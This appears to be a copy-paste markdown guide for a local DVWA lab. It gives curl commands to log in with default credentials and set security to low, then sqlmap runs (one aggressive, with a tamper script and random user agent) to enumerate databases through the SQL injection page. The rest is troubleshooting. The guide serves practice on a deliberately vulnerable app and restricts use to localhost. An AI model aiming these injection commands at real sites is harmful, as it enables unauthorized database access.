# DVWA SQLi — TL;DR Fix & sqlmap Commands (Copy‑Paste for GitHub)

**Purpose:** A short, copy‑and‑pasteable markdown document you can upload to GitHub. It contains the *exact* commands to fix the `security=impossible` / 302 redirect problem, verify a working DVWA session, and run `sqlmap` reliably. Use these commands **one line at a time** in your VM terminal.

---

## How to use
1. Save this file in your repository (e.g., `DVWA_SQLi_TLDR_and_Fix.md`).
2. Open your VM terminal. Copy and paste the commands **one at a time**.
3. If any command output does not match the expected result (see notes below), paste that output into the issue/PR or message where you need help.

---

## Quick summary (what this fixes)
- Forces a fresh logged‑in DVWA terminal session (programmatic login).
- Ensures `security=low` is set for that session.
- Tests the SQLi page with the explicit cookie header.
- Runs `sqlmap` using that same cookie (reliable) or runs a more aggressive mode if needed.

---

## **One‑shot TL;DR** (run these **three** command groups in order)

**1) Recreate cookie and set security low (overwrite `cookies.txt`):**
```bash
rm -f ~/cookies.txt
curl -s -c ~/cookies.txt -d "username=admin&password=password&Login=Login" "http://127.0.0.1/dvwa/login.php" > /dev/null
curl -s -b ~/cookies.txt -c ~/cookies.txt -d "security=low&seclev_submit=Submit" "http://127.0.0.1/dvwa/security.php" > /dev/null
```

*Expected:* `~/cookies.txt` exists and contains a `PHPSESSID` line and a `security` cookie set to `low`.

**2) Test the vulnerable page using an explicit cookie header:**
```bash
SESSION=$(awk '/PHPSESSID/ {print $7; exit}' ~/cookies.txt); echo "SESSION=$SESSION"
curl -s -I --cookie "PHPSESSID=${SESSION}; security=low" "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" | sed -n '1,12p'
```

*Expected:* `HTTP/1.1 200 OK` (or at least **not** `302 -> ../../login.php`). If you still see `302`, see the **Troubleshooting** section below.

**3) If step 2 is `200 OK`, run sqlmap with the same cookie (reliable):**
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=3 --risk=2 --dbs | tee sqlmap-dbs.txt
```

*If sqlmap reports not injectable, try the aggressive mode (same cookie):*
```bash
sqlmap -u "http://127.0.0.1/dvwa/vulnerabilities/sqli/?id=1&Submit=Submit" \
  --cookie="PHPSESSID=${SESSION}; security=low" -p id --batch --level=5 --risk=3 --technique=BEU --random-agent --tamper=space2comment --dbs | tee sqlmap-aggr.txt
```

---

## Troubleshooting — quick checks (run these if you still get `302`)

**A — Show cookies file:**
```bash
sed -n '1,200p' ~/cookies.txt
```
Should show `PHPSESSID` and `security	low`.

**B — Check DVWA setup page (setup may be required):**
```bash
curl -s "http://127.0.0.1/dvwa/setup.php" | sed -n '1,80p'
```
Look for `Create / Reset Database`.

**C — Check DVWA DB tables:**
```bash
mysql -u dvwauser -p -D dvwa -e "SHOW TABLES;"
```
(Enter `dvwapass` or the password you configured.) Expect a list of tables; if DB missing, run setup UI.

**D — Check PHP session save path & perms:**
```bash
php -i | grep session.save_path -n
ls -ld /var/lib/php/sessions 2>/dev/null || ls -ld /tmp
stat -c '%U %G %a %n' /var/lib/php/sessions 2>/dev/null || true
```
If not writable by `www-data`, run these to fix:
```bash
sudo mkdir -p /var/lib/php/sessions
sudo chown -R www-data:www-data /var/lib/php/sessions
sudo chmod 1733 /var/lib/php/sessions
sudo systemctl restart apache2
```

**E — If the server forces `security=impossible` on every new session**
Edit the DVWA config default security (backup first):
```bash
sudo cp /var/www/html/dvwa/config/config.inc.php /var/www/html/dvwa/config/config.inc.php.bak
sudo nano /var/www/html/dvwa/config/config.inc.php
# set default security to 'low' if present, save and exit
sudo systemctl restart apache2
```

---

## Uploading to GitHub
1. Save this file as `DVWA_SQLi_TLDR_and_Fix.md` in your repo.  
2. `git add DVWA_SQLi_TLDR_and_Fix.md && git commit -m "Add DVWA SQLi TLDR fix guide" && git push`.

---

## Notes & safety
- Only run these commands against your local DVWA VM. Do not run against third‑party websites.  
- If you want a longer version with more explanation and manual checks, use the full guide I previously created.

---

**End of TL;DR guide.**

